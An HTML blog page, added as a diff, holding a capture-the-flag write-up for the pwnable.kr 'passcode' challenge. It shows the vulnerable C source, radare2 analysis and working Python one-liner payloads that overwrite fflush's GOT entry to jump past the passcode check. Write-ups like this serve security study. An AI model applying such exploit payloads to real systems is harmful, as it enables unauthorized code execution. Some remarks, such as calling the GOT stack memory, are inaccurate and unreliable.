@@ -1,0 +1,144 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Pwnable.kr - passcode &middot; M1r4c13</title>
+<meta name="description" content="Pwnable.kr - passcode -- M1r4c13 study notes, restored.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='2.2' fill='%23d8c08a'/%3E%3Ccircle cx='8' cy='8' r='6.5' fill='none' stroke='%23d8c08a' stroke-opacity='.35' stroke-width='.8'/%3E%3C/svg%3E">
+<link rel="stylesheet" href="../blog.css">
+</head>
+<body>
+<header class="blog-head">
+<a class="mono back-link" href="/">xhyu@sky:~$ cd ~</a>
+<a class="brand brand-link" href="/blog/">M1r4c13</a>
+</header>
+<main><article class="post">
+<h1 class="post-title">Pwnable.kr - passcode</h1>
+<p class="meta"><span class="mono meta-date">2017.01.24</span><span class="tags"><span class="chip mono">ctf</span><span class="chip mono">pwnable.kr</span><span class="chip mono">radare2</span></span></p>
+<div class="post-body"><p>Writeup for <em>passcode</em> of <a href="http://pwnable.kr/play.php">pwnable.kr</a></p>
+<h3>0x00 Puzzle</h3>
+<pre><code class="language-bash">Mommy told me to make a passcode based login system.
+My initial C code was compiled without any error!
+Well, there was some compiler warning, but who cares about that?
+
+ssh passcode@pwnable.kr -p2222 (pw:guest)
+</code></pre>
+<h3>0x01 Explore</h3>
+<p>I'm using xshell in windows so the ssh cmd may different from which under linux.</p>
+<pre><code class="language-bash">$ ssh passcode@pwnable.kr 2222
+
+passcode@ubuntu:~$ ls -l
+total 16
+-r--r----- 1 root passcode_pwn   48 Jun 26  2014 flag
+-r-xr-sr-x 1 root passcode_pwn 7485 Jun 26  2014 passcode
+-rw-r--r-- 1 root root          858 Jun 26  2014 passcode.c
+</code></pre>
+<p>So obviously, we need to pwn passcode to read the flag file.<br>
+Take a look at passcode.c:</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+void login(){
+        int passcode1;
+        int passcode2;
+
+        printf(&quot;enter passcode1 : &quot;);
+        scanf(&quot;%d&quot;, passcode1);
+        fflush(stdin);
+
+        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+        printf(&quot;enter passcode2 : &quot;);
+        scanf(&quot;%d&quot;, passcode2);
+
+        printf(&quot;checking...\n&quot;);
+        if(passcode1==338150 &amp;&amp; passcode2==13371337){
+                printf(&quot;Login OK!\n&quot;);
+                system(&quot;/bin/cat flag&quot;);
+        }
+        else{
+                printf(&quot;Login Failed!\n&quot;);
+                exit(0);
+        }
+}
+
+void welcome(){
+        char name[100];
+        printf(&quot;enter you name : &quot;);
+        scanf(&quot;%100s&quot;, name);
+        printf(&quot;Welcome %s!\n&quot;, name);
+}
+
+int main(){
+        printf(&quot;Toddler's Secure Login System 1.0 beta.\n&quot;);
+
+        welcome();
+        login();
+
+        // something after login...
+        printf(&quot;Now I can safely trust you that you have credential :)\n&quot;);
+        return 0;
+}
+</code></pre>
+<p>There are two lines write in the wrong way:</p>
+<pre><code class="language-c">scanf(&quot;%d&quot;, passcode1);
+scanf(&quot;%d&quot;, passcode2);
+</code></pre>
+<p>Both passcode1 and passcode2 are not initialized after declaimed.<br>
+So traditionally, the end bytes of the <em>name</em> variable in welcome() should stay on the stack when passcode1 and passcode2 are using. </p>
+<p>Since <code>scanf("%100s", name);</code> limits the input length to 100 bytes, we cannot overflow it.</p>
+<p>So I considered to construct the payload:<br>
+Our target is <code>passcode1==338150(0x000528e6) &amp;&amp; passcode2==13371337(0x00cc07c9)</code><br>
+<code>python -c "print 'A' * 92 + '\xe6\x28\x05\x00' + '\xc9\x07\xcc\x00'" | ./passcode</code></p>
+<p>If we recompile the passcode.c with <code>gcc -m32 -o passcode passcode.c -g</code>, this payload should work:<br>
+<img alt="" src="/blog/images/2017/01/---4.PNG"><br>
+Please ignore those debug lines starting with 'passcode.*'.</p>
+<p>But when I tested it on the ~/passcode, which have the privilege we need, it failed.</p>
+<p>Then throw it into gdb, we can see that we can only control the passcode1 by the last 4 bytes of <em>name</em>, but not the passcode2. (I don't know exactly why, but I guess it's something to do with the difference of gcc flags when compiling)</p>
+<p>From this point, my turned to seeking help.</p>
+<h3>0x03 Solution and things learned</h3>
+<p>From the <a href="https://www.youtube.com/watch?v=bV_gr0hB1AA">solution vedio</a> and <a href="http://burningcodes.net/pwnable%E5%88%B7%E9%A2%98writeup%E4%B9%8Btoddlers-bottle%EF%BC%88%E4%B8%80%EF%BC%89/">this blog</a>, I learned about GOT modification.</p>
+<p>There is a function calling right after scanf(passcode1): <code>fflush(stdin)</code>.<br>
+It's a system call and we can find it's GOT address by using <code>rabin2</code>:<br>
+<code>rabin2 -R passcode</code></p>
+<pre><code class="language-bash">passcode@ubuntu:~$ rabin2 -R passcode
+[Relocations]
+vaddr=0x08049ff0 paddr=0x00000ff0 type=SET_32 __gmon_start__
+vaddr=0x0804a02c paddr=0x0000102c type=SET_64
+vaddr=0x0804a000 paddr=0x00001000 type=SET_32 printf
+vaddr=0x0804a004 paddr=0x00001004 type=SET_32 fflush  &lt;--------This line
+vaddr=0x0804a008 paddr=0x00001008 type=SET_32 __stack_chk_fail
+vaddr=0x0804a00c paddr=0x0000100c type=SET_32 puts
+vaddr=0x0804a010 paddr=0x00001010 type=SET_32 system
+vaddr=0x0804a014 paddr=0x00001014 type=SET_32 __gmon_start__
+vaddr=0x0804a018 paddr=0x00001018 type=SET_32 exit
+vaddr=0x0804a01c paddr=0x0000101c type=SET_32 __libc_start_main
+vaddr=0x0804a020 paddr=0x00001020 type=SET_32 __isoc99_scanf
+
+11 relocations
+</code></pre>
+<p>The fflush's acture address is stored on 0x0804a004 (GOT, on the stack).<br>
+If we can change it to other address of the program, we can skip the checking and get the flag directly.</p>
+<p>To achieve that, we just let the value of passcode1 to be 0x0804a004, then when scanf("%d", passcode1), we input the address of somewhere we need.</p>
+<p>Using gdb or objdump or radare to get the start address of system("/bin/cat flag");</p>
+<pre><code class="language-bash">$ r2 passcode
+[...]&gt; aaa
+[...]&gt; afl
+[...]&gt; s sym.login
+[...]&gt; pdf
+</code></pre>
+<p><img alt="" src="/blog/images/2017/01/---5.PNG"><br>
+We can see, right after the two <code>jne</code>, there is printf('Login OK') and system('cat flag').<br>
+The address we need is 0x080485d7 (I prefer this) or 0x0485e3.</p>
+<p>Then construct the final payload:<br>
+<code>python -c "print 'A' * 96 + '\x04\xa0\x04\x08' + '134514135'" | ~/passcode</code> <br>
+(0x080485d7==134514135)</p>
+<p><img alt="" src="/blog/images/2017/01/---6.PNG"> </p>
+<p>Done!</p></div>
+</article></main>
+<footer class="blog-foot">
+ <p class="mono foot-line">m1r4c13 &middot; study notes &middot; 2017 to 2018 &middot; restored</p>
+ <p class="coda"><span class="cn-inline">世界并不完美，却令人着迷。</span></p>
+</footer>
+</body>
+</html>
